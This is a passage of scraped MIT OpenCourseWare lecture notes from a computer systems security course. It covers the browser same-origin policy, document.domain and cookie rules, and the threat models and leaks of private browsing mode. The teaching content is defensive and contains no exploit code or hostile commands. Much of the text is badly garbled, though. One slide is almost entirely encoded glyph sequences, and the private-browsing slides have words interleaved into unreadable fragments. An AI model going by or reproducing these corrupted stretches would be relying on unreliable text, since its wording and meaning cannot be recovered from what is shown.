of subtleties	&#13; and inconsistencies.
Q: Why not rewrite the security model from scratch?
A1: Backwards compatibility! There's a huge amount of preexisting	&#13; web
infrastructure	&#13; th at	&#13; people rely	&#13; on.
A2: How	&#13; do we know that a new security model would be expressive
enough? Users typically	&#13; do not accept	&#13; a reduction	&#13; of features in	&#13; exchange for
an increase in	&#13; security.
A3: Any security model may be intrinsically doomed---perhaps all popular
systems are destined to accumulate a ton of features as time progresses. [Ex:
Word processing programs, smartphones.]
What might a better design look like?
oStrict isolation Embassies---everything is a network message, even
locally
 https://www.usenix.org/system/files/conference/nsdi13/nsd
i13-final85.pdf
oDon't make policy extraction and enforcement dependent on complex
parsing rules (remember our sanitization example)
9Since</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>/g4/g27/g40/g1/g46/g34/g31 /g27/g40/g27/g38/g51/g46/g35/g29/g45 /g29/g41/g30/g31 /g32/g44/g41/g39 /g33/g41/g41/g33/g38/g31/g56/g29/g41/g39 /g27/g29/g29/g31/g45/g45 /g45/g46/g27/g46/g31 /g35/g40/g1/g46/g34/g31 /g36/g18/g47/g31/g44/g51/g1/g29/g41/g30/g31 /g32/g44/g41/g39
/g29/g30/g40/g56/g32/g41/g41/g56/g29/g41/g39/g60 /g64/g20/g31/g31/g39/g45 /g39/g27/g51/g28/g31 /g28/g27/g30 /g45/g35/g40/g29/g31 /g30/g35/g32/g32/g31/g44/g31/g40/g46 /g42/g44/g35/g40/g29/g35/g42/g27/g38/g45 /g49/g44/g41/g46/g31/g1/g46/g34/g31 /g29/g41/g30/g31/g54/g1/g28/g47/g46
/g46/g34/g31/g51 /g27/g44/g31 /g35/g40/g29/g38/g47/g30/g31/g30 /g35/g40 /g46/g34/g31 /g45/g27/g39/g31 /g32/g44/g27/g39 /g31/g56/g56/g56 /g65
/g4/g27/g40/g1/g46/g34/g31 /g36/g18/g47/g31/g44/g51 /g29/g41/g30/g31 /g32/g44/g41/g39 /g29/g30/g40/g56/g32/g41/g41/g56/g29/g41/g39 /g27/g29/g29/g31/g45/g45 /g45/g46/g27/g46/g31 /g35/g40/g1/g46/g34/g31 /g35/g40/g38/g35/g40/g31 /g11/g27/g48/g27/g20/g29/g44/g35/g42/g46/g1/g29/g41/g30/g31
/g30/g31/g32/g35/g40/g31/g30 /g28/g51 /g32/g41/g41/g56/g29/g41/g39/g60 /g64/g21/g34/g31/g51/g68/g44/g31 /g66/g27/g38/g39/g41/g45/g46/g66 /g32/g44/g41/g39 /g46/g34/g31 /g45/g27/g39/g31 /g42/g38/g27/g29/g31/g56/g56/g56 /g65
/g4/g27/g40 /g46/g34/g31/g1/g27/g40/g27/g38/g51/g46/g35/g29/g45/g1/g29/g41/g30/g31 /g41/g44 /g36/g18/g47/g31/g44/g51/g1/g27/g29/g29/g31/g45/g45 /g46/g34/g31 /g9/g21/g14/g13 /g46/g31/g50/g46/g1/g35/g40/g42/g47/g46/g45/g60/g1/g64/g24/g31/g68/g48/g31 /g33/g41/g46/g1/g46/g41/g39/g27/g37/g31 /g46/g34/g27/g46 /g29/g41/g40/g46/g31/g40/g46 /g35/g40/g46/g31/g44/g27/g29/g46/g35/g48/g31 /g45/g41/g39/g31/g34/g41/g49/g56/g65
/g4/g27/g40/g1/g11/g27/g48/g27/g20/g29/g44/g35/g42/g46 /g35/g40 /g46/g34/g31 /g7/g27/g29/g31/g28/g41/g41/g37 /g32/g44/g27/g39/g31 /g46/g41/g47/g29/g34 /g27/g40/g51 /g45/g46/g27/g46/g31 /g35/g40 /g46/g34/g31 /g32/g41/g41/g56/g29/g41/g39 /g32/g44/g27/g39/g31/g60 /g5/g41/g31/g45/g35/g46 /g39/g27/g46/g46/g31/g44 /g46/g34/g27/g46 /g46/g34/g31 /g7/g27/g29/g31/g28/g41/g41/g37 /g32/g44/g27/g39/g31 /g35/g45 /g34/g46/g46/g42/g45/g55/g61/g61/g54 /g28/g47/g46 /g46/g34/g31 /g32/g41/g41/g56/g29/g41/g39 /g32/g44/g27/g39/g31 /g35/g45 /g44/g31/g33/g47/g38/g27/g44
/g34/g46/g46/g42/g55/g61/g61/g60
/g21/g41 /g27/g40/g45/g49/g31/g44/g1/g46/g34/g31/g45/g31/g1/g43/g47/g31/g45/g46/g35/g41/g40/g45/g54/g1/g28/g44/g41/g49/g45/g31/g44/g45/g1/g47/g45/g31 /g27 /g45/g31/g29/g47/g44/g35/g46/g51 /g39/g41/g30/g31/g38 /g29/g27/g38/g38/g31/g30 /g46/g34/g31 /g45/g27/g39/g31/g58/g41/g44/g35/g33/g35/g40/g1
/g42/g41/g38/g35/g29/g51/g56
/g23/g27/g33/g47/g31/g1/g33/g41/g27/g38/g55/g1/g21/g49/g41/g1/g30/g35/g32/g32/g31/g44/g31/g40/g46 /g49/g31/g28/g45/g35/g46/g31/g45/g1/g45/g34/g41/g47/g38/g30/g1/g40/g41/g46 /g28/g31 /g27/g28/g38/g31 /g46/g41 /g46/g27/g39/g42/g31/g44 /g49/g35/g46/g34 /g31/g27/g29/g34
/g41/g46/g34/g31/g44/g68/g45/g1/g29/g41/g40/g46/g31/g40/g46/g56
/g6/g27/g45/g51 /g46/g41 /g45/g46/g27/g46/g31/g54 /g28/g47/g46 /g46/g44/g35/g29/g37/g51 /g46/g41 /g35/g39/g42/g38/g31/g39/g31/g40/g46/g56
o/g16/g28/g48/g35/g41/g47/g45/g38/g51/g1/g28/g27/g30/g55 /g10/g32 /g10 /g34/g27/g48/g31 /g46/g49/g41 /g30/g35/g32/g32/g31/g44/g31/g40/g46 /g49/g31/g28/g1/g45/g35/g46/g31/g45 /g41/g42/g31/g40/g54/g1/g46/g34/g31 /g32/g35/g44/g45/g46/g1/g45/g35/g46/g31 /g45/g34/g41/g47/g38/g30
/g40/g41/g46 /g28/g31 /g27/g28/g38/g31 /g46/g41 /g41/g48/g31/g44/g49/g44/g35/g46/g31/g1/g46/g34/g31 /g48/g35/g45/g47/g27/g38 /g30/g35/g45/g42/g38/g27/g51 /g41/g32 /g46/g34/g31/g1/g45/g31/g29/g41/g40/g30 /g45/g35/g46/g31/g56
o/g16/g28/g48/g35/g41/g47/g45/g38/g51/g1/g33/g41/g41/g30/g55 /g5/g31/g48/g31/g38/g41/g42/g31/g44/g45 /g45/g34/g41/g47/g38/g30 /g28/g31 /g27/g28/g38/g31 /g46/g41 /g29/g44/g31/g27/g46/g31 /g39/g27/g45/g34/g58/g47/g42/g1/g45/g35/g46/g31/g45 /g46/g34/g27/g46
/g29/g41/g39/g28/g35/g40/g31 /g29/g41/g40/g46/g31/g40/g46 /g32/g44/g41/g39 /g39/g47/g46/g47/g27/g38/g38/g51 /g29/g41/g41/g42/g31/g44/g27/g46/g35/g48/g31 /g49/g31/g28 /g45/g35/g46/g31/g45/g56
/square4/g58/g6/g50/g55 /g2 /g45/g35/g46/g31 /g46/g34/g27/g46 /g29/g41/g39/g28/g35/g40/g31/g45 /g8/g41/g41/g33/g38/g31 /g14/g27/g42 /g30/g27/g46/g27 /g49/g35/g46/g34/g1/g44/g31/g27/g38 /g31/g45/g46/g27/g46/g31/g1/g30/g27/g46/g27/g56
/square4/g58/g6/g50/g55 /g2/g30/g48/g31/g44/g46/g35/g45/g46/g31/g39/g31/g40/g46/g45/g56
/square4/g58/g6/g50/g55 /g20/g41/g29/g35/g27/g38 /g39/g31/g30/g35/g27 /g49/g35/g30/g33/g31/g46/g45 /g62/g31/g56/g33/g56/g54/g1/g46/g34/g31 /g7/g27/g29/g31/g28/g41/g41/g37 /g69/g38/g35/g37/g31/g69 /g28/g47/g46/g46/g41/g40/g63/g56
o/g9/g27/g44/g30/g1/g46/g41 /g45/g27/g51/g55 /g10/g32 /g27 /g42/g27/g33/g31 /g32/g44/g41/g39 /g49/g31/g28 /g45/g31/g44/g48/g31/g44 /g25 /g30/g41/g49/g40/g38/g41/g27/g30/g45/g1/g27 /g11/g27/g48/g27/g20/g29/g44/g35/g42/g46 /g38/g35/g28/g44/g27/g44/g51/g32/g44/g41/g39 /g27 /g30/g35/g32/g32/g31/g44/g31/g40/g46 /g45/g31/g44/g48/g31/g44 /g26/g54/g1/g49/g34/g27/g46 /g29/g27/g42/g27/g28/g35/g38/g35/g46/g35/g31/g45 /g45/g34/g41/g47/g38/g30/g1/g46/g34/g27/g46 /g45/g29/g44/g35/g42/g46 /g34/g27/g48/g31/g60
/g3/g27/g45/g35/g29 /g45/g46/g44/g27/g46/g31/g33/g51 /g41/g32 /g45/g27/g39/g31/g58/g41/g44/g35/g33/g35/g40/g1/g42/g41/g38/g35/g29/g51/g55/g1/g21/g34/g31 /g28/g44/g41/g49/g45/g31/g44 /g27/g45/g45/g35/g33/g40/g45 /g27/g40 /g41/g44/g35/g33/g35/g40/g1/g46/g41 /g31/g48/g31/g44/g51/g44/g31/g45/g41/g47/g44/g29/g31/g1/g35/g40 /g27 /g42/g27/g33/g31/g54 /g35/g40/g29/g38/g47/g30/g35/g40/g33/g1/g11/g27/g48/g27/g20/g29/g44/g35/g42/g46 /g38/g35/g28/g44/g27/g44/g35/g31/g45/g56/g1/g11/g27/g48/g27/g20/g29/g44/g35/g42/g46 /g29/g41/g30/g31 /g29/g27/g40 /g41/g40/g38/g51/g1/g27/g29/g29/g31/g45/g45
/g44/g31/g45/g41/g47/g44/g29/g31/g45/g1/g46/g34/g27/g46 /g28/g31/g38/g41/g40/g33 /g46/g41/g1/g35/g46/g45/g1/g41/g44/g35/g33/g35/g40/g56
/g5/g31/g32/g35/g40/g35/g46/g35/g41/g40 /g41/g32 /g27/g40
/g41/g44/g35/g33/g35/g40/g55 /g45/g29/g34/g31/g39/g31 /g79 /g34/g41/g45/g46/g40/g27/g39/g31 /g79 /g42/g41/g44/g46
/g7/g41/g44 /g31/g50/g27/g39/g42/g38/g31/g55
o/g34/g46/g46/g42/g55/g61/g61/g32/g41/g41/g56/g29/g41/g39/g61/g35/g40/g30/g31/g50/g56/g34/g46/g39/g38 /g62/g34/g46/g46/g42/g54 /g32/g41/g41/g56/g29/g41/g39/g54 /g77/g70 /g64/g35/g39/g42/g38/g35/g29/g35/g46/g65/g63
o/g34/g46/g46/g42/g45/g55/g61/g61/g32/g41/g41/g56/g29/g41/g39/g61/g35/g40/g30/g31/g50/g56/g34/g46/g39/g38 /g62/g34/g46/g46/g42/g45/g54 /g32/g41/g41/g56/g29/g41/g39/g54 /g74/g74/g73 /g64/g35/g39/g42/g38/g35/g29/g35/g46/g65/g63
o/g34/g46/g46/g42/g55/g61/g61/g28/g27/g44/g56/g29/g41/g39/g55/g77/g71/g77/g71/g61/g35/g40/g30/g31/g50/g56/g34/g46/g39/g38/g3/g62/g34/g46/g46/g42/g54 /g3/g28/g27/g44/g56/g29/g41/g39/g54/g3/g77/g71/g77/g71/g63
/g20/g29/g34/g31/g39/g31/g45 /g29/g27/g40
/g28/g31 /g34/g46/g46/g42/g54 /g34/g46/g46/g42/g45/g54 /g32/g46/g42/g54 /g32/g35/g38/g31/g54 /g31/g46/g29/g56
/g7/g41/g47/g44 /g39/g27/g35/g40 /g35/g30/g31/g27/g45/g55
/g71/g56 /g6/g27/g29/g34 /g41/g44/g35/g33/g35/g40/g1/g35/g45 /g27/g45/g45/g41/g29/g35/g27/g46/g31/g30 /g49/g35/g46/g34 /g29/g38/g35/g31/g40/g46/g58/g45/g35/g30/g31 /g44/g31/g45/g41/g47/g44/g29/g31/g45/g1/g62/g31/g56/g33/g56/g54 /g29/g41/g41/g37/g35/g31/g45/g54 /g5/g16/g14
/g45/g46/g41/g44/g27/g33/g31/g54 /g27 /g11/g27/g48/g27/g20/g29/g44/g35/g42/g46 /g40/g27/g39/g31/g45/g42/g27/g29/g31/g54 /g27 /g5/g16/g14 /g46/g44/g31/g31/g54 /g49/g35/g40/g30/g41/g49/g45/g54 /g27 /g48/g35/g45/g47/g27/g38/g1/g30/g35/g45/g42/g38/g27/g51
/g27/g44/g31/g27/g54/g1/g40/g31/g46/g49/g41/g44/g37/g1/g27/g30/g30/g44/g31/g45/g45/g31/g45/g63/g56
/square4/g2/g40 /g41/g44/g35/g33/g35/g40 /g35/g45 /g46/g34/g31 /g39/g41/g44/g27/g38 /g31/g43/g47/g35/g48/g27/g38/g31/g40/g46 /g41/g32 /g27 /g22/g10/g5 /g35/g40/g1/g46/g34/g31 /g22/g40/g35/g50/g1/g49/g41/g44/g38/g30/g56
/g72/g56 /g6/g27/g29/g34 /g32/g44/g27/g39/g31 /g33/g31/g46/g45 /g46/g34/g31 /g41/g44/g35/g33/g35/g40 /g41/g32 /g35/g46/g45 /g22/g19/g13/g56 /g2 /g32/g44/g27/g39/g31 /g35/g45 /g46/g34/g31 /g39/g41/g44/g27/g38 /g31/g43/g47/g35/g48/g27/g38/g31/g40/g46 /g41/g32 /g27
/g42/g44/g41/g29/g31/g45/g45 /g35/g40 /g22/g40/g35/g50/g56
/g73/g56 /g20/g29/g44/g35/g42/g46/g45 /g35/g40/g29/g38/g47/g30/g31/g30 /g28/g51 /g27 /g32/g44/g27/g39/g31 /g31/g50/g31/g29/g47/g46/g31 /g49/g35/g46/g34 /g46/g34/g31 /g27/g47/g46/g34/g41/g44/g35/g46/g51 /g41/g32 /g46/g34/g27/g46/g1/g9/g21/g14/g13 /g32/g35/g38/g31/g68/g45
/g41/g44/g35/g33/g35/g40/g56 /g21/g34/g35/g45 /g35/g45 /g46/g44/g47/g31/g1/g32/g41/g44 /g28/g41/g46/g34/g1/g35/g40/g38/g35/g40/g31 /g45/g29/g44/g35/g42/g46/g45/g1/g66/g27/g40/g30/g66 /g41/g40/g31/g45 /g46/g34/g27/g46 /g27/g44/g31/g1/g42/g47/g38/g38/g31/g30/g1/g32/g44/g41/g39
/g31/g50/g46/g31/g44/g40/g27/g38 /g30/g41/g39/g27/g35/g40/g45/g59 /g64/g22/g40/g35/g50 /g27/g40/g27/g38/g41/g33/g51/g55 /g19/g47/g40/g40/g35/g40/g33 /g27 /g28/g35/g40/g27/g44/g51/g1/g46/g34/g27/g46/g68/g45 /g45/g46/g41/g44/g31/g30 /g35/g40/g1/g45/g41/g39/g31/g28/g41/g30/g51 /g31/g38/g45/g31/g68/g45 /g34/g41/g39/g31 /g30/g35/g44/g31/g29/g46/g41/g44/g51/g56/g65
/g22</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>Get the origin of the adjusted document.domain
oA frame's document.domain is originally derived from the URL in the
normal	&#13; way.
oA frame can set document.domain to be a suffix of the full domain. Ex:
x.y.z.com //Original value
y.z.com
//Allowable new value
z.com //Allowable new value
a.y.z.com //Disallowed
.com //Disallowed
oBrowsers distinguish between a document.domain that	&#13; has
been	&#13; written,
and one that	&#13; has no
t,even if both have the same value! Two frames can
access each other if:
oThey have both set document.domain to the samevalue,	&#13; or
oNeither	&#13; has	&#13; chan ged	&#13; document.domain (and	&#13; those
values	&#13; are equal in both frames)
oThese rules	&#13; help protect a site from  being attacked  by a buggy/maliciou s 
subdomain, e.g., x.y.z.com trying to attack  
y.z.com  by shortening	&#13; its  
document.domain.
DOM nodes
Get the	&#13; origin	&#13; of their surrounding frame
Cookies
A cookie has a domain AND a
path. Ex: *.mit.edu/6.858/
oDomain can only be a (possibly full) suffix
of a page's current domain.
oPath	&#13; can be	&#13; "/" to	&#13; indicate	&#13; t
hat all paths	&#13; in the domain should have access
to the cookie.
Whoever sets cookie gets to specify
the domain and path.
oCan be	&#13; set by	&#13; the	&#13; server using a header, or by
JavaScript	&#13; code that	&#13; writes
todocument.cookie.
oThere's also	&#13; a
"secure" flag	&#13; to	&#13; indicate HTTPS -only	&#13; cookies.
Browser keeps cookies on	&#13; cli
ent-side	&#13; disk (modulo cookie expiration,	&#13; ephemeral
cookies,	&#13; etc.).
When	&#13; generating	&#13; an HTTP
request,	&#13; the browser sends all matching cookies in
the request.
oSecure	&#13; cookies only sent for HTTPS	&#13; requests.
JavaScript code
can access any cookie that match the code's or
igin,	&#13; but note that
the
cookie's path and the origin's port	&#13; are ignored!
oThe protocol matters, because HTTP	&#13; JavaScript cannot access HTTPS
cookies	&#13; (although	&#13; HTTPS JavaScript can access	&#13; both	&#13; k
inds	&#13; of cookies).
Q: Why
is it important to protect cookies from arbitrary	&#13; overwriting?
5</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-11-ur-web/</video_url>
          <video_title>Lecture 11: Ur/Web</video_title>
          <transcript/>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Private Browsing (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec18/</lecture_pdf_url>
      <lectureno>18</lectureno>
      <slides>
        <slide>
          <slideno>0</slideno>
          <text>6.858	&#13; Lecture	&#13; 18 	&#13; 
PRIVATE	&#13; BROWSING 	&#13; 
Wh
Va
otat
her	&#13; users.	&#13; 
gis	&#13; 
ue	&#13; th
ideae	&#13; go
l:	&#13; a
	&#13; (al	&#13; o
ctf	&#13;  ?

 ivitpri
y	&#13; va
of)	&#13; cy
a	&#13; 
 
	&#13; given	&#13; user	&#13; is 	&#13; indistinguishable	&#13; from	&#13; (activity	&#13; of)	&#13; many	&#13; 
Toda
o y	&#13; w
The'l
erl	&#13; discuss	&#13; priva
ecy	&#13; in	&#13; t
becaus's
e	&#13; n
	&#13; weo	&#13; f
b	&#13; appliormal	&#13; d
catiefi
onithe	&#13; cont
ion	&#13; of	&#13; whext
at	&#13; of	&#13; w
	&#13; prieb
va	&#13; b
terow
	&#13; bsers. 	&#13; 
o state	&#13; can	&#13; be	&#13; generated. 	&#13; ns	&#13; are	&#13; so 	&#13; complicated	&#13; ar
now
d	&#13; s
si
on
	&#13; mug	&#13; me
cha
	&#13; n
ins
c,	&#13; 
rin
imi	&#13; pa
nr
at
t	&#13; 
ing	&#13; 
o B
u
Assr
eo
rw
	&#13; ds
ee
mars	&#13; u
np
dd
	&#13; aa
nte
d	&#13; 
	&#13; t
wh
hei
ar
t	&#13; 
	&#13; i
	&#13; ompleme
	&#13; users rely	&#13; on	&#13; private	&#13; bt
rowher	&#13; bron
wta
st
eio
rn
	&#13; vendors	&#13; do.	&#13; of	&#13; private	&#13; browsing	&#13; according	&#13; to	&#13; 
more	&#13; implementation	&#13; deficiensin
cieg
s	&#13; mo
	&#13; emede
r,
g	&#13; they	&#13; expe	&#13; 
e!	&#13; ct	&#13; more	&#13; from	&#13; it...	&#13; and	&#13; 
	&#13; W
 ha
Pt
a	&#13; d
p
oo
e
 r	&#13; t
	&#13; h
foe
r	&#13; b
maro
lw
izs
ee
sr
	&#13; ts
h	&#13; me
is	&#13; aa
sn
	&#13; t	&#13; 
wby
hoo	&#13; "
A	&#13; local	&#13; attacker	&#13; w 	&#13; p	&#13; spriva
rate
te	&#13; b
	&#13; tr
oe
sp
sa
esses	&#13; yho
rw
easi
tn
	&#13; mog"?
d	&#13; 
els	&#13; +	&#13; attacks:	&#13; 
o wants
A	&#13; web	&#13; to
	&#13; at	&#13; d
tai
cs
kc
eo
rv
	&#13; wer
h	&#13; wh
o	&#13; hi
ac
sh
	&#13; 	&#13; s
coite
mps	&#13; you'ou
vr
e	&#13; ma
	&#13; visitchine	&#13; post
ed.	&#13; -browsing	&#13; session,	&#13; and 	&#13; 
 If	&#13; the	&#13; two	&#13; attacker
o wants	&#13; to	&#13; link	&#13; y
s	&#13; can	&#13; colludou	&#13; across	&#13; privatero
	&#13; mi
ans
de
e,	&#13; it's	&#13; easier 	&#13; for	&#13; /d
o	&#13; 
ra	&#13; we
	&#13; norb	&#13; s
mae
lr
	&#13; sve
esr
s	&#13; th
them	&#13; to	&#13; identi
io
fynat	&#13; yo
s.	&#13; u	&#13; contact,	&#13; and 	&#13; 
o server's	&#13; Ex:	&#13; A	&#13; loc
aa
ccess	&#13; l	&#13; attac
lk
ogs.er	&#13; a
	&#13; sks	&#13; the	&#13; server	&#13; to	&#13; check	&#13; for	&#13; the	&#13; local	&#13; IP	&#13; use
	&#13; adr.	&#13; 
dress	&#13; in 	&#13; the	&#13; 
So,	&#13; ther
isolation.e's	&#13; pr
	&#13; actical	&#13; value	&#13; to	&#13; security	&#13; against	&#13; these	&#13; two	&#13; attacks	&#13; in	&#13; 
	&#13; 
Threat	&#13; 1:	&#13; Loc
 
 toAs
	&#13; lesu
armp
n	&#13; whtioal	&#13; attac
n
at:	&#13; At
	&#13; tackker.
 Security	&#13; goal:	&#13; s
Atite
tas
c	&#13; te
hr
e	&#13; 
	&#13; g	&#13; 
ets	&#13; cont
ker	&#13; u
cs
ae
nr
'	&#13; 
tv
goals	&#13; lirol	&#13; of	&#13; the	&#13; user's 	&#13; machine	&#13; post-session,	&#13; and	&#13; wants	&#13; 
Non
o-
 	&#13; es
ait
re
nd
	&#13; t	&#13; i
hn
o	&#13; p
seri
	&#13; sv
ia
tt
ee
s	&#13; 
!b
	&#13; rowsing	&#13; mode.	&#13; 
Don
't
 	&#13; care	&#13; about	&#13; achievin
 At
ket
ya
sc
trk
oe
ker	&#13; c
	&#13; loou
ggeld	&#13; mo
r)	&#13; anddg	&#13; 
ip
fyriva
	&#13; scy	&#13; for	&#13; *fu
	&#13; tro
acft
k	&#13; fwa
uturre	&#13; o
ent
	&#13; tu te	&#13; brow
	&#13; hre*
e	&#13; ma	&#13; priva
browsing.chi
	&#13; ne	&#13; (e.g.,	&#13; ising	&#13; 
nstasessions.
lling	&#13; a	&#13; 	&#13; 
o This	&#13; is	&#13; w
Hide	&#13; 
 the	&#13; ma
fac
cthi
	&#13; n
thae	&#13; h
*befy	&#13; w
ore	&#13; a
e*	&#13; prlso	&#13; a
t	&#13; private	&#13; browivate	&#13; brssume	&#13; t
owshat	&#13; 
ing	&#13; sthe	&#13; attacke
tarts. 	&#13; r	&#13; can't	&#13; access	&#13; the	&#13; 
 The	&#13; paOften	&#13; called	&#13; "plausiblesing	&#13; was	&#13; used.	&#13; 
why.	&#13; Laper	&#13; sa
ter	&#13; inys	&#13; t
	&#13; the	&#13; ha
lectt	&#13; this	&#13; is	&#13; difficul	&#13; deniability". 	&#13; 
	&#13; ure,	&#13; we'll	&#13; discut	&#13; to
ss	&#13; ac
	&#13; soh
meiev
	&#13; e
p,	&#13; but	&#13; d
otentio
ae
l	&#13; s
rn'
eat	&#13; e
soxplai
ns.	&#13; n	&#13; 
Wh
we
 	&#13; at	&#13; ki
mend
1)Javaa
Sn
crip	&#13; "s
s	&#13; o
tof
r	&#13; pe
edr
	&#13; os
nis
	&#13; te
thnt	&#13; c
e	&#13; loli
cae
lnt
	&#13; d-
iside	&#13; 
sk."]	&#13; state 	&#13; can	&#13; a	&#13; private	&#13; session	&#13; leak?	&#13; [By	&#13; p ersistent, 	&#13; 
t-accessible	&#13; state:	&#13; Cookies, 	&#13; DOM	&#13; storage 	&#13; 
1
1</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>A:	&#13; It's	&#13; convenient	&#13; for	&#13; users	&#13; to	&#13; be
prbrowsing	&#13; mode
ivate	&#13; session	&#13; ends.---the	&#13; browser	&#13; wi	&#13; able	&#13; to	&#13; create	&#13; ephemeral	&#13; sessions
ll	&#13; delete	&#13; the	&#13; associated 	&#13; cookies	&#13; when	&#13; t	&#13; in	&#13; priva
he	&#13; te	&#13; 
	&#13; 
 	&#13; 
 Q:
A:	&#13; Ideally,	&#13; each	&#13; private	&#13; session	&#13; should	&#13; What	&#13; should	&#13; happen	&#13; to	&#13; state	&#13; across
	&#13; 	&#13; 
stprivate	&#13; mode	&#13; 
over	&#13; between	&#13; multiple	&#13; private
owever,	&#13; since	&#13; some	&#13; kinds	&#13; of	&#13; statesessions,	&#13; tart	&#13; wsessions? 	&#13; 
user	&#13; can	&#13; be	&#13; fingerprinted!	&#13; H	&#13;  his	&#13; increaith	&#13; a	&#13; b
ses	&#13; lank
the	&#13; 	&#13; sl
la
ikte
el---
ihoodif	&#13; sta
	&#13; t
the	&#13; 
at	&#13; thcarries	&#13; 
e	&#13; 
kipr
ndivate
os-to-	&#13; can	&#13; leak	&#13; from	&#13; 
downloaded	&#13; items.]
 	&#13; of	&#13; stapublic,
te	&#13; can	&#13; indeed	&#13; persist	&#13; and	&#13; some	&#13; kinds	&#13; of	&#13; state	&#13; can	&#13; leak
	&#13; across 	&#13; private	&#13; mode	&#13; sessions.	&#13; [Ex:	&#13; certificates,	&#13; from	&#13; public-to -private,	&#13; some	&#13; 
	&#13; 	&#13; 
So,	&#13; think	&#13; of	&#13; each	&#13; private	&#13; mode
public	&#13; mode.	&#13; 	&#13; session	&#13; as	&#13; sharing	&#13; some	&#13; state	&#13; with	&#13; a	&#13; singl e	&#13; 
	&#13; Br
 
 o
They	&#13; awser	&#13; e
re	&#13; privilxtensions
eged	&#13; code	&#13; t	&#13; and	&#13; plugi
hans
They	&#13; are	&#13; not	&#13; subject	&#13; to	&#13; the	&#13; samet	&#13; ar
	&#13; cae
n	&#13; a	&#13; spe
ccesscial.
	&#13; 	&#13; 
 sensitive	&#13; state.	&#13; 
Also,	&#13; they	&#13; are	&#13; often	&#13; developed	&#13; by	&#13; someone
o -origin	&#13; policy	&#13; or
	&#13; other	&#13; t	&#13; other
han	&#13; t	&#13; br
he	&#13; ows
broer
ws	&#13; s
eecur
r	&#13; vendity	&#13; checks
or!	&#13; .	&#13; 
o Thus,	&#13; they	&#13; might	&#13; not	&#13; be	&#13; aware	&#13; of
misimplement	&#13; the	&#13; intended	&#13; private	&#13; mode	&#13; semantics,	&#13; or	&#13; they	&#13; might	&#13; 
HTMHowever,
L5	&#13; offers	&#13; 	&#13; plug
nin
ews	&#13; a	&#13; policy. 	&#13; 
that	&#13; us
 ed	&#13; to	&#13; requir	&#13; 
efeare	&#13; p
urob
res	&#13; ably	&#13; going	&#13; to	&#13; become	&#13; extinct	&#13; in	&#13; the
	&#13; Flast
h,	&#13; applewhich	&#13; 
ts,p
	&#13; Silverrovide	&#13; 
light,	&#13; etc.native 	&#13; su
	&#13; pport	&#13; for	&#13; 	&#13; 
fenear
atur	&#13; futur
es	&#13; e!	&#13; 
 Ref:	&#13; http://msdn.microsoft.com/en
 us
Multimedia:	&#13; &lt;video&gt;,	&#13; &lt;audio&gt;/library/ie/hh968248(v=vs.85).as-
px	&#13; 
  Gra
Offliphics:	&#13; &lt;ca
ne	&#13; stonvas&gt;,	&#13; WebGL 	&#13; 	&#13; 
	&#13; Network:	&#13; Wrage
eb	&#13; :
sock	&#13; DOM	&#13; s
ets,	&#13; to
COrage
RS	&#13; 
	&#13; 
The	&#13; pa
 Privatper	&#13; w
o e	&#13; browas	&#13; wr
sing	&#13; is	&#13; stitten	&#13; in	&#13; 2
ill0
	&#13; t1
rick0---
y	&#13; twh
o	&#13; at'
get	&#13; rs	&#13; th
ight!e	&#13; current
	&#13; 	&#13; state	&#13; of	&#13; private	&#13; browsing? 	&#13; 
Ex:	&#13; Firefox	&#13; bug	&#13; fix	&#13; from	&#13; January
public	&#13; cookies
 	&#13; to	&#13; leak 	&#13; into	&#13; priva	&#13; 
t2014:	&#13; 
e-mode	&#13; HThe	&#13; 
TTP	&#13; fetches.pdf.js	&#13; extension	&#13; 
	&#13; was	&#13; allowing	&#13; 
 Ref:	&#13; The	&#13; exhttps://g
tension	&#13; withub.com/mozilla/pdf.js/issues/4234
asn't	&#13; checking	&#13; whether	&#13; private	&#13; browsing	&#13; mode]	&#13; 
o was	&#13; enabled!	&#13; 
mode	&#13; and	&#13; then	&#13; close	&#13; the	&#13; window,	&#13; youEx:	&#13; Open	&#13; Firefox	&#13; bug	&#13; from	&#13; 2011:	&#13; If	&#13; 
	&#13; you	&#13; visit
	&#13; can	&#13; go	&#13; to	&#13; about:memory	&#13; and	&#13; find	&#13; 	&#13; a	&#13; page	&#13; in	&#13; private	&#13; browsing	&#13; 
information
about:memory	&#13; will	&#13; list	&#13; the	&#13; URL
 	&#13; about	&#13; the	&#13; window	&#13; yo
for	&#13; u	&#13; s
 Ref:	&#13; https://bugzilla.moz	&#13; 
illatse
.org/showhe	&#13; uppo
windowdly	&#13; clo
).	&#13; sed	&#13; (e.g.,	&#13; 
The	&#13; problem	&#13; is	&#13; that	&#13; window	&#13; objects_b
closing	&#13; the	&#13; window	&#13;  doesn't	&#13; force	&#13; a	&#13; s	&#13; 
ynchare	&#13; lazug.cgi?
i
noly	&#13; garid=709326
bage	&#13; colle	&#13; 
ro us	&#13; garbage	&#13; cocte
llectid,	&#13; s
oo	&#13; 
for	&#13; the	&#13; window.	&#13; n</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>2)
3)  BrHistows
ory	&#13; er
of	&#13; 	&#13; cach
visite
ed	&#13; 	&#13; 
4) Configuration	&#13; stata
 e:	&#13; ddresses
bookmarks	&#13; New	&#13; clien	&#13; 
t	&#13; certificates, 	&#13; updates	&#13; to	&#13; saved	&#13; password	&#13; database,	&#13; 
5)DowNew	&#13; n
6)
 	&#13;  pl
loa
uginsded	&#13; 
/brfiles
ows	&#13; 
er	&#13; extensions 	&#13; 
 Private	&#13; browsing	&#13; implementations	&#13; all	&#13; try	&#13; to	&#13; prevent	&#13; persistent	&#13; le
Net3.	&#13; How
ow
 orkever,	&#13; 
	&#13; activit4,	&#13; 5,	&#13; 
y	&#13; a
cand	&#13; 
n	&#13; 6
lea	&#13; oft
ve	&#13; en	&#13; persist
persistent	&#13; a
	&#13; ft
evidenceer	&#13; the	&#13; priva
---DNSte	&#13; session
	&#13; resolut	&#13; ends.aks
